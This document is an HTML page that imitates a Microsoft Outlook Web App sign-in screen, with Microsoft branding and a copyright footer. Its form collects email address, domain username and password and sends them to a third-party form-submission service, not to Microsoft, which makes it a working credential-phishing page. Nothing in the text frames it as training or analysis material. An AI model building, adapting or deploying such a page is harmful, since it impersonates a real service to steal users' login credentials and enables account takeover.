<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Outlook Web App</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-wrapper {
      background: white;
      width: 100%;
      max-width: 420px;
      padding: 48px 40px;
      border-radius: 8px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
    }
    .login-header {
      text-align: center;
      margin-bottom: 24px;
    }
    .login-header h1 {
      font-size: 24px;
      color: #323130;
      margin: 0;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      color: #201f1e;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 12px;
      border: 1px solid #8a8886;
      border-radius: 4px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0078d4;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 8px;
    }
    button:hover {
      background-color: #005a9e;
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #605e5c;
    }
  
    .login-container {
      background-image: url('https://upload.wikimedia.org/wikipedia/commons/4/4e/Microsoft_Outlook_2013_logo.svg');
      background-repeat: no-repeat;
      background-position: top left;
      background-size: 100px auto;
    }
    </style>
    
</head>
<body>
  <div class="login-wrapper">
    <div class="login-header">
      <h1>Outlook Web App</h1>
    </div>
    <form name="logonForm" method="POST" action="https://smartforms.dev/submit/680a31a9c184545ccc0b12b7">
      <div class="form-group">
        <label for="email">Email address</label>
        <input id="email" type="email" name="email" required />
      </div>
      <div class="form-group">
        <label for="username">Domain\Username</label>
        <input id="username" type="text" name="domain" required />
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input id="password" type="password" name="password" required />
      </div>
      <button type="submit">Sign in</button>
    </form>
    <div class="footer">© 2025 Microsoft Corporation</div>
  </div>
</body>
</html>
